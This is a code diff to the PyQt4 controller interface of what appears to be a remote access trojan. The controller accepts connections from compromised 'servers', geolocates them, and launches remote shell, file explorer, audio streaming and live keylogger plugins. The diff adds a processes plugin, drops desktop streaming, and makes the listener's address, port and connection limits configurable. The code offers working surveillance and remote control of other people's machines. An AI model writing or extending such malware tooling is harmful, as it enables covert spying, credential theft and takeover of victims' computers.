@@ -19,13 +19,14 @@ from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
 from ui import gui
+from settings import Config
 
 from libs.modechat import get, send
 from plugins.maudio import main as maudio
 from plugins.mexplorer import main as mexplorer
 from plugins.mshell import main as mshell
-from plugins.mdesktop import main as mdesktop
 from plugins.mkeylogger import main as mkeylogger
+from plugins.mprocesses import main as mprocesses
 
 # initial geo ip database
 geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
@@ -61,11 +62,25 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         super(MainDialog, self).__init__(parent)
         self.setupUi(self)
 
-        # sockets Timeout
-        self.timeout = None
+        self.settings = Config()
+
+        # set settings
+        try:
+            self.IPADDRESS = self.settings.ip_address
+            self.PORT = self.settings.port
+            self.MAXCONNECTIONS = self.settings.max_connections
+            self.TIMEOUT = self.settings.timeout
+        except AttributeError:
+            self.settings = Config()
+            self.IPADDRESS = self.settings.ip_address
+            self.PORT = self.settings.port
+            self.MAXCONNECTIONS = self.settings.max_connections
+            self.TIMEOUT = self.settings.timeout
 
         # update gui
         self.gui = QApplication.processEvents
+
+        self.portLabel.setText(str(self.PORT))
 
         # unlocked servers bank
         self.unlockedSockets = []
@@ -81,9 +96,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteShellButton.setDisabled(True)
         self.remoteExplorerButton.setDisabled(True)
         self.remoteAudioButton.setDisabled(True)
-        self.remoteDesktopButton.setDisabled(True)
-        self.remoteDesktopButton2.setDisabled(True)
         self.remoteKeyloggerButton.setDisabled(True)
+        self.remoteProcessesButton.setDisabled(True)
         self.lockServerButton.setDisabled(True)
         self.lockServerButton.setVisible(False)
         self.quitServerButton.setDisabled(True)
@@ -115,7 +129,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Triggers
         self.startListenButton.clicked.connect(self.listen_start)
         self.stopListenButton.clicked.connect(self.listen_stop)
-        self.serversTable.clicked.connect(self.update_main_menu)
+        self.serversTable.clicked.connect(self.update_preview)
 
         # Panel Triggers
         self.updatePreviewButton.clicked.connect(self.get_desktop_preview)
@@ -125,9 +139,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteShellButton.clicked.connect(lambda: self.run_plugin('shellMode'))
         self.remoteExplorerButton.clicked.connect(lambda: self.run_plugin('explorerMode'))
         self.remoteAudioButton.clicked.connect(lambda: self.run_plugin('audioMode'))
-        self.remoteDesktopButton.clicked.connect(lambda: self.run_plugin('desktopMode'))
-        self.remoteDesktopButton2.clicked.connect(lambda: self.run_plugin('desktopMode'))
         self.remoteKeyloggerButton.clicked.connect(lambda: self.run_plugin('keyloggerMode'))
+        self.remoteProcessesButton.clicked.connect(lambda: self.run_plugin('processesMode'))
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
@@ -135,8 +148,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_plugin(plugin='shell'))
         self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
         self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
-        self.connect(self, SIGNAL('executeDesktop()'), lambda: self.execute_plugin(plugin='desktop'))
         self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
+        self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_plugin(plugin='processes'))
 
     # Start Listen for Servers
     def listen_start(self):
@@ -145,7 +158,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.socks = {}
             self.streaming_socks = {}
             self.acceptthreadState = True
-            self.listenthread = Thread(target=self.accept_connections, args=(4434,))
+            self.listenthread = Thread(target=self.accept_connections)
             self.listenthread.setDaemon(True)
             self.listenthread.start()
             self.statusLabel.setText('Listening')
@@ -167,7 +180,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.onlineStatus.setText('0')
             try:
                 self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.shd.connect(('127.0.0.1', 4434))
+                self.shd.connect(('127.0.0.1', self.PORT))
                 self.shd.close()
             except:
                 pass
@@ -178,7 +191,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     # listen for clients
     # accept connections
-    def accept_connections(self, port):
+    def accept_connections(self):
 
         # Initializing socket
         self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -186,10 +199,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         # Bind address
-        self.c.bind(('0.0.0.0', int(port)))
+        self.c.bind((self.IPADDRESS, self.PORT))
 
         # Start listen for connections
-        self.c.listen(128)
+        self.c.listen(self.MAXCONNECTIONS)
 
         # Start Servers Check Thread
         servers_check_start = threading.Thread(target=self.check_servers)
@@ -216,7 +229,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     info = ast.literal_eval(data)
 
                     # Set timeout None
-                    self.sock.settimeout(self.timeout)
+                    self.sock.settimeout(self.TIMEOUT)
 
                     # Save connected socket
                     socket_index = self.address[1]
@@ -251,8 +264,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                             self.send_run_signal(self.sock, mode)
 
-                    except ValueError as e:
-                        print e
+                    except ValueError:
+                        pass
 
     # Servers Live Update
     def check_servers(self):
@@ -314,10 +327,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 lock_status = 'LOCKED' if self.streaming_socks[obj]['protection'] == 'False' else 'UNLOCKED'
                 item = QTableWidgetItem(lock_status)
                 if lock_status == 'LOCKED':
-                    item.setTextColor(QColor('#e74c3c'))
+                    item.setTextColor(QColor('#e67e22'))
                     item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
                 else:
-                    item.setTextColor(QColor('lime'))
+                    item.setTextColor(QColor('#2ecc71'))
                     item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                 self.serversTable.setItem(index, self.index_of_lock, item)
 
@@ -338,7 +351,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 # add active windows title
                 item = QTableWidgetItem(self.streaming_socks[obj]['activewindowtitle'])
                 item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
-                item.setTextColor(QColor('#f39c12'))
+                item.setTextColor(QColor('#1abc9c'))
                 self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)
         except RuntimeError:
             pass
@@ -351,7 +364,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
                 server = self.current_server()
                 if server:
-                    text, ok = QInputDialog.getText(self, 'Unlock Server', 'Enter Password: ')
+                    text, ok = QInputDialog.getText(self, 'Unlock Server', 'Enter Password: ', QLineEdit.Password)
                     if ok:
                         _hash = hashlib.md5()
                         _hash.update(str(text))
@@ -369,6 +382,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if server:
             send(self.socks[server]['sock'], 'lock')
 
+    def update_preview(self):
+        self.get_desktop_preview()
+        self.emit(SIGNAL('updatePanel()'))
+
     def update_main_menu(self):
         try:
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
@@ -378,9 +395,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteExplorerButton.setDisabled(True)
                 self.remoteShellButton.setDisabled(True)
                 self.remoteAudioButton.setDisabled(True)
-                self.remoteDesktopButton.setDisabled(True)
-                self.remoteDesktopButton2.setDisabled(True)
                 self.remoteKeyloggerButton.setDisabled(True)
+                self.remoteProcessesButton.setDisabled(True)
                 self.lockServerButton.setVisible(False)
                 self.lockServerButton.setDisabled(True)
                 self.quitServerButton.setDisabled(True)
@@ -388,9 +404,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteExplorerButton.setDisabled(False)
                 self.remoteShellButton.setDisabled(False)
                 self.remoteAudioButton.setDisabled(False)
-                self.remoteDesktopButton.setDisabled(False)
-                self.remoteDesktopButton2.setDisabled(False)
                 self.remoteKeyloggerButton.setDisabled(False)
+                self.remoteProcessesButton.setDisabled(False)
                 self.lockServerButton.setVisible(True)
                 self.lockServerButton.setDisabled(False)
                 self.quitServerButton.setDisabled(False)
@@ -401,9 +416,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.remoteExplorerButton.setDisabled(True)
             self.remoteShellButton.setDisabled(True)
             self.remoteAudioButton.setDisabled(True)
-            self.remoteDesktopButton.setDisabled(True)
-            self.remoteDesktopButton2.setDisabled(True)
             self.remoteKeyloggerButton.setDisabled(True)
+            self.remoteProcessesButton.setDisabled(True)
             self.lockServerButton.setVisible(False)
             self.lockServerButton.setDisabled(True)
             self.quitServerButton.setDisabled(True)
@@ -411,34 +425,36 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
 
+
     def server_right_click_menu(self, point):
         server_index = self.serversTable.currentRow()
         server_menu = QMenu(self)
         server_options_menu = QMenu('Server Options', self)
         server_options_menu.setIcon(QIcon(os.path.join(assets, 'settings.png')))
 
-        if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
-            server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
+        if self.serversTable.selectedItems():
+            if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
+                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
 
-        else:
-            server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell',
-                                  lambda: self.run_plugin('shellMode'))
-            server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
-                                  lambda: self.run_plugin('explorerMode'))
-            server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming',
-                                  lambda: self.run_plugin('audioMode'))
-            server_menu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')), 'Desktop Streaming',
-                                  lambda: self.run_plugin('desktopMode'))
-            server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
-                                  lambda: self.run_plugin('keyloggerMode'))
+            else:
+                server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell',
+                                      lambda: self.run_plugin('shellMode'))
+                server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
+                                      lambda: self.run_plugin('explorerMode'))
+                server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming',
+                                      lambda: self.run_plugin('audioMode'))
+                server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
+                                      lambda: self.run_plugin('keyloggerMode'))
+                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), 'Processes',
+                                      lambda: self.run_plugin('processesMode'))
 
-            server_menu.addSeparator()
-            server_menu.addMenu(server_options_menu)
-            server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
-                                          self.lock_server)
-            server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
-                                          self.lock_server)
-        server_menu.exec_(self.serversTable.mapToGlobal(point))
+                server_menu.addSeparator()
+                server_menu.addMenu(server_options_menu)
+                server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
+                                              self.lock_server)
+                server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
+                                              self.lock_server)
+            server_menu.exec_(self.serversTable.mapToGlobal(point))
 
     # get item
     def current_server(self):
@@ -454,8 +470,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'shellMode': 'executeShell()',
             'explorerMode': 'executeExplorer()',
             'audioMode': 'executeAudio()',
-            'desktopMode': 'executeDesktop()',
-            'keyloggerMode': 'executeKeylogger()'
+            'keyloggerMode': 'executeKeylogger()',
+            'processesMode': 'executeProcesses()'
         }
         if signal in signals:
             self.current_sock = sock
@@ -466,8 +482,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'shell': mshell,
             'explorer': mexplorer,
             'audio': maudio,
-            'desktop': mdesktop,
-            'keylogger': mkeylogger
+            'keylogger': mkeylogger,
+            'processes': mprocesses
         }
 
         server = self.current_server()
@@ -492,9 +508,51 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         sys.exit(1)
 
 
+class MovieSplashScreen(QSplashScreen):
+
+    def __init__(self, movie, parent = None):
+
+        movie.jumpToFrame(0)
+        pixmap = QPixmap(movie.frameRect().size())
+
+        QSplashScreen.__init__(self, pixmap)
+        self.movie = movie
+        self.movie.frameChanged.connect(self.repaint)
+
+    def showEvent(self, event):
+        self.movie.start()
+
+    def hideEvent(self, event):
+        self.movie.stop()
+
+    def paintEvent(self, event):
+
+        painter = QPainter(self)
+        pixmap = self.movie.currentPixmap()
+        self.setMask(pixmap.mask())
+        painter.drawPixmap(0, 0, pixmap)
+
+    def sizeHint(self):
+
+        return self.movie.scaledSize()
+
+
 # Run Application
 if __name__ == '__main__':
     app = QApplication(sys.argv)
+
+    movie = QMovie("assets\\splash.gif")
+    splash = MovieSplashScreen(movie)
+    splash.show()
+
+    start = time.time()
+
+    while movie.state() == QMovie.Running and time.time() < start + 5:
+        app.processEvents()
+
     form = MainDialog()
     form.show()
+    splash.finish(form)
+
+
     sys.exit(app.exec_())
